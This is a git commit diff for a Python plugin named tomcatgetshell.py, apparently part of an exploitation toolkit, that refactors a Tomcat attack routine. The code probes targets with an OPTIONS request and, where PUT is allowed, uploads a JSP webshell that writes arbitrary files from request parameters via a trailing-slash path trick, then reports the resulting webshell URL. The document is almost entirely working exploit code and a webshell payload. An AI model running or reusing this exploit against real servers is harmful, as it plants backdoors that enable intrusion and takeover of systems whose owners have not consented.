629155016b8d6cefd33776b4b05b148e57d60241
Jaqen <591875624@qq.com>
2018-04-13 22:42:47 +0800

    fix error

--- plugins/tomcatgetshell.py
+++ plugins/tomcatgetshell.py
@@ -16,35 +16,27 @@ def get_plugin_info():
         "Create_date":"2017-10-01"
     }
 
-def TomcatGetshell(domain):
-    body = """<%  if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>"""
-    #body = '''upload success!'''
-    try:
-        resp = requests.options(domain)
-        if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0 :
-            url = domain+'/success.jsp/'
-            #url = "/" + str(int(time.time()))+'.jsp::$DATA'
-            resp_put = requests.put(url, data=body)
-            if resp_put.status  == 201 :
-                return 'webshell:'+url[:-1]
-            elif resp_put.status == 204 :
-                logging.error('file exists')
-                return '%s 开启了PUT方法且webshell已存在'%domain
-            else:
-                logging.error('PUT upload fail')
-                return '%s 开启了PUT方法'%domain
-    except Exception,e:
-        logging.error(e)
-        pass
-    return False
-
 def exploit(ip):
     result = []
     if FindDomain_flag != 'n':
         if Domain:
             for domain in Domain:
-                RETURN = TomcatGetshell(domain)
-                if RETURN:
-                    result.append(RETURN)
+                    body = """<%  if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>"""
+                    #body = '''upload success!'''
+                    try:
+                        resp = requests.options(domain)
+                        if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0 :
+                            url = domain+'/success.jsp/'
+                            #url = "/" + str(int(time.time()))+'.jsp::$DATA'
+                            resp_put = requests.put(url, data=body)
+                            if resp_put.status  == 201 :
+                                result.append('webshell:'+url[:-1])
+                            elif resp_put.status == 204 :
+                                result.append('%s >>>> 开启了PUT方法且webshell已存在'%domain)
+                            else:
+                                result.append('%s >>>> 开启了PUT方法'%domain)
+                    except Exception,e:
+                        logging.error(e)
+                        pass
             if len(result):
                 return result
